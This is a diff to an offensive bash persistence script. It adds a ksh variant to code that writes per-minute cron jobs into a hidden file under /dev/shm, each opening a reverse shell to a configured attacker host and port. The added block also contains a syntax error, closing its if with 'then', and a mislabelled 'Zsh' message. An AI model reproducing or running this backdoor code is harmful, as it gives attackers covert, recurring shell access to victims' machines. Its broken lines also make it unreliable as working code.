@@ -1,5 +1,7 @@
 #!/bin/bash
 
+#Modular version
+
 attackBox=0.0.0.0
 attackPort=5253
 cron="* * * * *"
@@ -19,6 +21,11 @@ if $(which bash | grep -qi bash);
 then
 	bash="yes"
 fi
+
+if $(which ksh | grep -qi ksh);
+then
+	ksh="yes"
+then
 
 if $(which python | grep -qi python);
 then
@@ -84,6 +91,11 @@ then
 				then
 					echo "$cron bash -c 'bash -i >& /dev/tcp/$attackBox/$attackPort 0>&1'" >> /dev/shm/.cron.sh
 					echo -e "\e[92m[+]\e[0m Bash reverse shell loaded in crontab"
+				fi
+				if [ "$ksh" == "yes" ];
+				then
+					echo "$cron ksh -c 'ksh -i > /dev/tcp/$attackBox/$attackPort 2>&1 0>&1'" >> /dev/shm/.cron.sh
+					echo -e "\e[92m[+]\e[0m Zsh reverse shell loaded in crontab"
 				fi
 				if [ "$python" == "yes" ];
 				then
